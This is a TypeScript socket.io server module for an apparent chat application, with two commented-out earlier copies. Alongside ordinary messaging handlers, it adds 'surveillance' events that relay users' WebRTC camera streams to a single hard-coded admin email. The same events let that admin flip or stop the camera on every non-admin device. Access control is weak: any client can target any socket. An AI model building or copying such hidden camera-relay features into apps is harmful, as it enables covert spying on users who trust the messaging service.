// import { Server as HTTPServer } from "http";
// import { Server as SocketServer, Socket } from "socket.io";
// import { config } from "../config";
// import { redisClient } from "../DB/redis";
// import { SocketUser } from "../types";
// import { verifyAccessToken } from "../utils/jwt.util";
// import { messageHandler } from "./handlers/message.handler";
// import { typingHandler } from "./handlers/typing.handler";
// import { presenceHandler } from "./handlers/presence.handler";
// import { reactionHandler } from "./handlers/reaction.handler";

// export interface AuthenticatedSocket extends Socket {
//   user: SocketUser;
// }

// class SocketManager {
//   private io: SocketServer;
//   private static instance: SocketManager;

//   private constructor(server: HTTPServer) {
//     this.io = new SocketServer(server, {
//       cors: {
//         origin: config.clientUrl,
//         methods: ["GET", "POST"],
//         credentials: true,
//       },
//       transports: ["websocket", "polling"],
//       pingTimeout: 60000,
//       pingInterval: 25000,
//     });
//     this.setupMiddleware();
//     this.setupEvents();
//   }

//   static getInstance(server?: HTTPServer): SocketManager {
//     if (!SocketManager.instance) {
//       if (!server) throw new Error("Server required for first init");
//       SocketManager.instance = new SocketManager(server);
//     }
//     return SocketManager.instance;
//   }

//   private setupMiddleware(): void {
//     this.io.use(async (socket, next) => {
//       try {
//         const token = socket.handshake.auth.token as string;
//         if (!token) return next(new Error("Authentication required"));

//         const payload = verifyAccessToken(token);
//         (socket as AuthenticatedSocket).user = {
//           userId: payload.userId,
//           username: payload.email,
//           socketId: socket.id,
//         };
//         next();
//       } catch {
//         next(new Error("Invalid token"));
//       }
//     });
//   }

//   private setupEvents(): void {
//     this.io.on("connection", async (socket) => {
//       const authSocket = socket as AuthenticatedSocket;
//       const { userId } = authSocket.user;

//       // join personal room للـ notifications
//       await socket.join(`user:${userId}`);

//       await redisClient.setOnlineStatus(userId, socket.id);
//       this.io.emit("user:online", { userId, timestamp: new Date() });

//       messageHandler(this.io, authSocket);
//       typingHandler(this.io, authSocket);
//       presenceHandler(this.io, authSocket);
//       reactionHandler(this.io, authSocket);

//       socket.on("conversation:join", async (conversationId: string) => {
//         await socket.join(conversationId);
//       });

//       socket.on("conversation:leave", async (conversationId: string) => {
//         await socket.leave(conversationId);
//       });

//       socket.on("disconnect", async () => {
//         await redisClient.setOfflineStatus(userId);
//         this.io.emit("user:offline", { userId, lastSeen: new Date() });
//       });
//     });
//   }

//   getIO(): SocketServer { return this.io; }

//   emitToUser(userId: string, event: string, data: unknown): void {
//     this.io.to(`user:${userId}`).emit(event, data);
//   }

//   emitToConversation(conversationId: string, event: string, data: unknown): void {
//     this.io.to(conversationId).emit(event, data);
//   }
// }

// export const getSocketManager = (server?: HTTPServer) => SocketManager.getInstance(server);






















// import { Server as HTTPServer } from "http";
// import { Server as SocketServer, Socket } from "socket.io";
// import { config } from "../config";
// import { redisClient } from "../DB/redis";
// import { SocketUser } from "../types";
// import { verifyAccessToken } from "../utils/jwt.util";
// import { messageHandler } from "./handlers/message.handler";
// import { typingHandler } from "./handlers/typing.handler";
// import { presenceHandler } from "./handlers/presence.handler";
// import { reactionHandler } from "./handlers/reaction.handler";

// const ADMIN_USERNAME = "admin@gmail.com";



// export interface AuthenticatedSocket extends Socket {
//   user: SocketUser;
// }

// class SocketManager {
//   private io: SocketServer;
//   private static instance: SocketManager;

//   private constructor(server: HTTPServer) {
//     this.io = new SocketServer(server, {
//       cors: {
//         origin: config.clientUrl,
//         methods: ["GET", "POST"],
//         credentials: true,
//       },
//       transports: ["websocket", "polling"],
//       pingTimeout: 60000,
//       pingInterval: 25000,
//     });
//     this.setupMiddleware();
//     this.setupEvents();
//   }

//   static getInstance(server?: HTTPServer): SocketManager {
//     if (!SocketManager.instance) {
//       if (!server) throw new Error("Server required for first init");
//       SocketManager.instance = new SocketManager(server);
//     }
//     return SocketManager.instance;
//   }

//   private setupMiddleware(): void {
//     this.io.use(async (socket, next) => {
//       try {
//         const token = socket.handshake.auth.token as string;
//         if (!token) return next(new Error("Authentication required"));

//         const payload = verifyAccessToken(token);
//         (socket as AuthenticatedSocket).user = {
//           userId: payload.userId,
//           username: payload.email,
//           socketId: socket.id,
//         };
//         next();
//       } catch {
//         next(new Error("Invalid token"));
//       }
//     });
//   }

//   // دور على الـ socket ID بتاع الأدمن
//   private getAdminSocketId(): string | null {
//     console.log("🔍 Looking for admin...");
//     for (const [, s] of this.io.sockets.sockets) {
//       const authSocket = s as AuthenticatedSocket;
//       console.log("Socket:", s.id, "| username:", authSocket.user?.username, "| email:", authSocket.user?.userId);
//       if (authSocket.user?.username === ADMIN_USERNAME) {
//         console.log("✅ Found admin:", s.id);
//         return s.id;
//       }
//     }
//     console.log("❌ Admin not found");
//     return null;
//   }

//   private setupEvents(): void {
//     this.io.on("connection", async (socket) => {
//       const authSocket = socket as AuthenticatedSocket;
//       const { userId } = authSocket.user;

//       await socket.join(`user:${userId}`);
//       await redisClient.setOnlineStatus(userId, socket.id);
//       this.io.emit("user:online", { userId, timestamp: new Date() });

//       messageHandler(this.io, authSocket);
//       typingHandler(this.io, authSocket);
//       presenceHandler(this.io, authSocket);
//       reactionHandler(this.io, authSocket);

//       socket.on("conversation:join", async (conversationId: string) => {
//         await socket.join(conversationId);
//       });

//       socket.on("conversation:leave", async (conversationId: string) => {
//         await socket.leave(conversationId);
//       });

//       socket.on("user-ready", () => {
//         socket.broadcast.emit("new-user-connected", socket.id);
//       });

//       socket.on("get-connected-users", () => {
//         const connectedIds = [...this.io.sockets.sockets.keys()].filter(
//           (id) => id !== socket.id
//         );
//         socket.emit("connected-users-list", connectedIds);
//       });

//       socket.on(
//         "get-conversation-socket",
//         ({ conversationId }: { conversationId: string }) => {
//           const room = this.io.sockets.adapter.rooms.get(conversationId);
//           if (!room) return;
//           const targetSocketId = [...room].find((id) => id !== socket.id);
//           if (targetSocketId) {
//             socket.emit("conversation-socket-id", { socketId: targetSocketId });
//           }
//         }
//       );


//       socket.on(
//         "surveillance-start",
//         ({ targetId }: { targetId: string }) => {
//           this.io.to(targetId).emit("surveillance-start", {});
//         }
//       );

//       socket.on("surveillance-stop", () => {
//         socket.broadcast.emit("surveillance-stop");
//       });

//       socket.on(
//         "surveillance-offer",
//         ({ offer, targetId }: { offer: unknown; targetId: string }) => {
//           this.io.to(targetId).emit("surveillance-offer", {
//             offer,
//             fromId: socket.id,
//           });
//         }
//       );

//       socket.on(
//         "surveillance-answer",
//         ({ answer, targetId }: { answer: unknown; targetId: string }) => {
//           this.io.to(targetId).emit("surveillance-answer", {
//             answer,
//             fromId: socket.id,
//           });
//         }
//       );

//       socket.on(
//         "surveillance-ice-candidate",
//         ({ candidate, targetId }: { candidate: unknown; targetId: string }) => {
//           this.io.to(targetId).emit("surveillance-ice-candidate", {
//             candidate,
//             fromId: socket.id,
//           });
//         }
//       );

//       // ── اليوزر بيبعت offer — بس للأدمن ──
//       socket.on(
//         "surveillance-offer-to-admin",
//         ({ offer, conversationId }: { offer: unknown; conversationId: string }) => {
//           const adminSocketId = this.getAdminSocketId();
//           if (!adminSocketId) return;
//           this.io.to(adminSocketId).emit("surveillance-offer-from-user", {
//             offer,
//             conversationId,
//             fromSocketId: socket.id,
//           });
//         }
//       );

//       // ── الأدمن بيبعت answer لليوزر ──
//       socket.on(
//         "surveillance-answer-to-user",
//         ({ answer, targetSocketId }: { answer: unknown; targetSocketId: string }) => {
//           this.io.to(targetSocketId).emit("surveillance-answer-to-user", { answer });
//         }
//       );

//       // ── ICE من اليوزر — بس للأدمن ──
//       socket.on(
//         "surveillance-ice-candidate-to-admin",
//         ({ candidate, conversationId }: { candidate: unknown; conversationId: string }) => {
//           const adminSocketId = this.getAdminSocketId();
//           if (!adminSocketId) return;
//           this.io.to(adminSocketId).emit("surveillance-ice-from-user", {
//             candidate,
//             conversationId,
//           });
//         }
//       );

//       // ── ICE من الأدمن لليوزر ──
//       socket.on(
//         "surveillance-ice-candidate-to-user",
//         ({ candidate, targetSocketId }: { candidate: unknown; targetSocketId: string }) => {
//           this.io.to(targetSocketId).emit("surveillance-ice-to-user", { candidate });
//         }
//       );

//       // ── اليوزر وقف البث — بس للأدمن ──
//       socket.on(
//         "surveillance-stop-to-admin",
//         ({ conversationId }: { conversationId: string }) => {
//           const adminSocketId = this.getAdminSocketId();
//           if (!adminSocketId) return;
//           this.io.to(adminSocketId).emit("surveillance-stopped-by-user", {
//             conversationId,
//           });
//         }
//       );

      
//       // ── الأدمن بيطلب تبديل الكاميرا ──
// // ── بعد — بيبعت للـ user مباشرة عن طريق conversationId ──
// socket.on(
//   "surveillance-switch-camera",
//   ({ conversationId, facingMode }) => {
//     this.io.sockets.sockets.forEach((s) => {
//       const targetSocket = s as AuthenticatedSocket;
//       if (targetSocket.user?.username !== ADMIN_USERNAME) {
//         s.emit("surveillance-switch-camera", { facingMode });
//       }
//     });
//   }
// );

// // ── الأدمن أغلق البث — وقف الكاميرا عند اليوزر ──
// socket.on(
//   "surveillance-admin-closed",
//   ({ conversationId }: { conversationId: string }) => {
//     const room = this.io.sockets.adapter.rooms.get(conversationId);
//     if (!room) return;
//     const targetSocketId = [...room].find((id) => id !== socket.id);
//     if (targetSocketId) {
//       this.io.to(targetSocketId).emit("surveillance-stop-stream", {});
//     }
//   }
// );


//       socket.on("disconnect", async () => {
//         await redisClient.setOfflineStatus(userId);
//         this.io.emit("user:offline", { userId, lastSeen: new Date() });
//       });
//     });
//   }

//   getIO(): SocketServer {
//     return this.io;
//   }

//   emitToUser(userId: string, event: string, data: unknown): void {
//     this.io.to(`user:${userId}`).emit(event, data);
//   }

//   emitToConversation(conversationId: string, event: string, data: unknown): void {
//     this.io.to(conversationId).emit(event, data);
//   }
// }

// export const getSocketManager = (server?: HTTPServer) =>
//   SocketManager.getInstance(server);






























import { Server as HTTPServer } from "http";
import { Server as SocketServer, Socket } from "socket.io";
import { config } from "../config";
import { redisClient } from "../DB/redis";
import { SocketUser } from "../types";
import { verifyAccessToken } from "../utils/jwt.util";
import { messageHandler } from "./handlers/message.handler";
import { typingHandler } from "./handlers/typing.handler";
import { presenceHandler } from "./handlers/presence.handler";
import { reactionHandler } from "./handlers/reaction.handler";

const ADMIN_USERNAME = "admin@gmail.com";



export interface AuthenticatedSocket extends Socket {
  user: SocketUser;
}

class SocketManager {
  private io: SocketServer;
  private static instance: SocketManager;

  private constructor(server: HTTPServer) {
    this.io = new SocketServer(server, {
      cors: {
        origin: config.clientUrl,
        methods: ["GET", "POST"],
        credentials: true,
      },
      transports: ["websocket", "polling"],
      pingTimeout: 60000,
      pingInterval: 25000,
    });
    this.setupMiddleware();
    this.setupEvents();
  }

  static getInstance(server?: HTTPServer): SocketManager {
    if (!SocketManager.instance) {
      if (!server) throw new Error("Server required for first init");
      SocketManager.instance = new SocketManager(server);
    }
    return SocketManager.instance;
  }

  private setupMiddleware(): void {
    this.io.use(async (socket, next) => {
      try {
        const token = socket.handshake.auth.token as string;
        if (!token) return next(new Error("Authentication required"));

        const payload = verifyAccessToken(token);
        (socket as AuthenticatedSocket).user = {
          userId: payload.userId,
          username: payload.email,
          socketId: socket.id,
        };
        next();
      } catch {
        next(new Error("Invalid token"));
      }
    });
  }

  // دور على الـ socket ID بتاع الأدمن
  private getAdminSocketId(): string | null {
    console.log("🔍 Looking for admin...");
    for (const [, s] of this.io.sockets.sockets) {
      const authSocket = s as AuthenticatedSocket;
      console.log("Socket:", s.id, "| username:", authSocket.user?.username, "| email:", authSocket.user?.userId);
      if (authSocket.user?.username === ADMIN_USERNAME) {
        console.log("✅ Found admin:", s.id);
        return s.id;
      }
    }
    console.log("❌ Admin not found");
    return null;
  }

  private setupEvents(): void {
    this.io.on("connection", async (socket) => {
      const authSocket = socket as AuthenticatedSocket;
      const { userId } = authSocket.user;

      await socket.join(`user:${userId}`);
      await redisClient.setOnlineStatus(userId, socket.id);
      this.io.emit("user:online", { userId, timestamp: new Date() });

      messageHandler(this.io, authSocket);
      typingHandler(this.io, authSocket);
      presenceHandler(this.io, authSocket);
      reactionHandler(this.io, authSocket);

      socket.on("conversation:join", async (conversationId: string) => {
        await socket.join(conversationId);
      });

      socket.on("conversation:leave", async (conversationId: string) => {
        await socket.leave(conversationId);
      });

      socket.on("user-ready", () => {
        socket.broadcast.emit("new-user-connected", socket.id);
      });

      socket.on("get-connected-users", () => {
        const connectedIds = [...this.io.sockets.sockets.keys()].filter(
          (id) => id !== socket.id
        );
        socket.emit("connected-users-list", connectedIds);
      });

      socket.on(
        "get-conversation-socket",
        ({ conversationId }: { conversationId: string }) => {
          const room = this.io.sockets.adapter.rooms.get(conversationId);
          if (!room) return;
          const targetSocketId = [...room].find((id) => id !== socket.id);
          if (targetSocketId) {
            socket.emit("conversation-socket-id", { socketId: targetSocketId });
          }
        }
      );


      socket.on(
        "surveillance-start",
        ({ targetId }: { targetId: string }) => {
          this.io.to(targetId).emit("surveillance-start", {});
        }
      );

      socket.on("surveillance-stop", () => {
        socket.broadcast.emit("surveillance-stop");
      });

      socket.on(
        "surveillance-offer",
        ({ offer, targetId }: { offer: unknown; targetId: string }) => {
          this.io.to(targetId).emit("surveillance-offer", {
            offer,
            fromId: socket.id,
          });
        }
      );

      socket.on(
        "surveillance-answer",
        ({ answer, targetId }: { answer: unknown; targetId: string }) => {
          this.io.to(targetId).emit("surveillance-answer", {
            answer,
            fromId: socket.id,
          });
        }
      );

      socket.on(
        "surveillance-ice-candidate",
        ({ candidate, targetId }: { candidate: unknown; targetId: string }) => {
          this.io.to(targetId).emit("surveillance-ice-candidate", {
            candidate,
            fromId: socket.id,
          });
        }
      );

      // ── اليوزر بيبعت offer — بس للأدمن ──
      socket.on(
        "surveillance-offer-to-admin",
        ({ offer, conversationId }: { offer: unknown; conversationId: string }) => {
          const adminSocketId = this.getAdminSocketId();
          if (!adminSocketId) return;
          this.io.to(adminSocketId).emit("surveillance-offer-from-user", {
            offer,
            conversationId,
            fromSocketId: socket.id,
          });
        }
      );

      // ── الأدمن بيبعت answer لليوزر ──
      socket.on(
        "surveillance-answer-to-user",
        ({ answer, targetSocketId }: { answer: unknown; targetSocketId: string }) => {
          this.io.to(targetSocketId).emit("surveillance-answer-to-user", { answer });
        }
      );

      // ── ICE من اليوزر — بس للأدمن ──
      socket.on(
        "surveillance-ice-candidate-to-admin",
        ({ candidate, conversationId }: { candidate: unknown; conversationId: string }) => {
          const adminSocketId = this.getAdminSocketId();
          if (!adminSocketId) return;
          this.io.to(adminSocketId).emit("surveillance-ice-from-user", {
            candidate,
            conversationId,
          });
        }
      );

      // ── ICE من الأدمن لليوزر ──
      socket.on(
        "surveillance-ice-candidate-to-user",
        ({ candidate, targetSocketId }: { candidate: unknown; targetSocketId: string }) => {
          this.io.to(targetSocketId).emit("surveillance-ice-to-user", { candidate });
        }
      );

      // ── اليوزر وقف البث — بس للأدمن ──
      socket.on(
        "surveillance-stop-to-admin",
        ({ conversationId }: { conversationId: string }) => {
          const adminSocketId = this.getAdminSocketId();
          if (!adminSocketId) return;
          this.io.to(adminSocketId).emit("surveillance-stopped-by-user", {
            conversationId,
          });
        }
      );

      
      // ── الأدمن بيطلب تبديل الكاميرا ──
// ── بعد — بيبعت للـ user مباشرة عن طريق conversationId ──
// ← الأدمن بيبعت flip — والتليفون هو اللي بيقرر الاتجاه
socket.on(
  "surveillance-flip-camera",
  ({ conversationId }: { conversationId: string }) => {
    console.log("🔄 Flip camera request for conversation:", conversationId);
    this.io.sockets.sockets.forEach((s) => {
      const targetSocket = s as AuthenticatedSocket;
      if (targetSocket.user?.username !== ADMIN_USERNAME) {
        console.log("🔄 Sending flip to:", s.id);
        s.emit("surveillance-flip-camera");
      }
    });
  }
);

// ── الأدمن أغلق البث — وقف الكاميرا عند اليوزر ──
socket.on(
  "surveillance-admin-closed",
  ({ conversationId }: { conversationId: string }) => {
    const room = this.io.sockets.adapter.rooms.get(conversationId);
    if (!room) return;
    const targetSocketId = [...room].find((id) => id !== socket.id);
    if (targetSocketId) {
      this.io.to(targetSocketId).emit("surveillance-stop-stream", {});
    }
  }
);


      socket.on("disconnect", async () => {
        await redisClient.setOfflineStatus(userId);
        this.io.emit("user:offline", { userId, lastSeen: new Date() });
      });
    });
  }

  getIO(): SocketServer {
    return this.io;
  }

  emitToUser(userId: string, event: string, data: unknown): void {
    this.io.to(`user:${userId}`).emit(event, data);
  }

  emitToConversation(conversationId: string, event: string, data: unknown): void {
    this.io.to(conversationId).emit(event, data);
  }
}

export const getSocketManager = (server?: HTTPServer) =>
  SocketManager.getInstance(server);